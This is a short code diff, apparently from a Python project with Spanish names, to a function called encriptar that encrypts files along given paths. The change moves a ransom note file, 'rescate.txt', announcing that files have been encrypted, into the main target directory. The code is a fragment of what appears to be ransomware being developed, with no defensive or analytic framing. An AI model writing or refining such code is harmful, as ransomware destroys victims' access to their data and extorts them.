@@ -45,7 +45,7 @@ def encriptar(rutas, clave1, ruta_principal):
         else:
             fich.close()
     if elem_enciptados:
-        fichero_rescate = open('rescate.txt', 'w')
+        fichero_rescate = open(ruta_principal + '/rescate.txt', 'w')
         fichero_rescate.write("Se han encriptado archivos!")
         fichero_rescate.close()
 
